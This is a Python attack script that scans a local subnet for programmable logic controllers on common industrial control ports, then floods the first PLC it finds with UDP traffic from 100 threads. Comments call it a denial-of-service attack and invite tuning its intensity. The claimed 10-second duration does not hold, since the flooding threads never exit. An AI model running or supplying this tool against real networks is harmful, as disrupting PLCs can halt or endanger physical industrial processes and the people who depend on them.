import scapy.all as scapy
import socket
import threading
import time

# Define network range to scan (adjust to match your local subnet)
NETWORK_RANGE = "192.168.1.0/24" 

# Common ICS ports (Modbus, S7comm, DNP3, OPC UA)
PLC_PORTS = [502, 102, 20000, 44818]  

def find_plc():
    """
    Scan the network to find an active PLC by probing common ICS ports.
    """
    print("[*] Scanning network for PLC devices...")

    # ARP scan for active devices
    ans, _ = scapy.arping(NETWORK_RANGE, timeout=2, verbose=False)

    for _, rcv in ans:
        ip = rcv.psrc
        for port in PLC_PORTS:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    print(f"[+] PLC Found: {ip} on Port {port}")
                    return ip
            except Exception as e:
                continue

    print("[-] No PLC found.")
    return None

def flood_plc(ip):
    """
    Flood the target PLC with excessive network traffic.
    """
    print(f"[*] Initiating DoS attack on {ip}...")

    def send_packets():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP Flood
                sock.sendto(b"\x00" * 1024, (ip, 502))  # Modbus typically uses port 502
                sock.close()
            except:
                break

    threads = []    
    for _ in range(100):  # Adjust thread count based on attack intensity
        t = threading.Thread(target=send_packets)
        t.start()
        threads.append(t)

    time.sleep(10)  # Attack duration
    print("[+] Attack completed.")
    
    # Ensure all threads are stopped
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    plc_ip = find_plc()
    if plc_ip:
        flood_plc(plc_ip)